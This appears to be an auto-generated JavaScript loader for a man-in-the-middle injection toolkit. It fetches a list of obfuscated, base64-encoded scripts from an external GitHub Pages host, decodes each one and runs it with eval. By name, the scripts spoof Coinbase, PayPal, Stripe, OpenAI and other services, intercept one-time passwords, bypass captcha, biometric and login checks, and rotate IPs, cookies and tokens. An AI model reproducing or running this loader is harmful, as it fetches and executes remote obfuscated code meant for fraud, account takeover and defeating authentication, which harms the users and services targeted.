// Auto-generated — DO NOT EDIT
(function(){const list=["amazon-spoof.js.b64","biometric.js.b64","captcha-bypass.js.b64","captcha.js.b64","claude-spoof.js.b64","coinbase-spoof.js.b64","faceid-pass.js.b64","fingerprint.js.b64","geofence.js.b64","instagram_shadowban.js.b64","location-fence-bypass.js.b64","moonpay_confirm.js.b64","old-device-fingerprint.js.b64","openai-spoof.js.b64","otp-intercept.js.b64","otp.js.b64","paypal-spoof.js.b64","rotate-cookies.js.b64","rotate-headers.js.b64","rotate-ip.js.b64","rotate-tokens.js.b64","spoof-coinbase.js.b64","spoof-openai.js.b64","spoof-stripe.js.b64","spoof-textnow.js.b64","stripe-radar-spoof.js.b64","stripe_radar.js.b64","tiktok-login-bypass.js.b64","tiktok-spoof.js.b64","tiktok_autologin.js.b64","typecloak.js.b64","voice-ai-bypass.js.b64","wallets-spoof.js.b64","wise-spoof.js.b64"];
const base="https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
function log(msg){console.log("[MITM]",msg);}
(async()=>{for(const f of list){
  const url=base+f;
  try{
    const res=await fetch(url);if(!res.ok)throw new Error(res.status);
    const decoded=atob(await res.text());
    (0,eval)(decoded);
    log("✓ injected "+f);
  }catch(e){log("✗ "+f+" -> "+e.message);}
}})();})();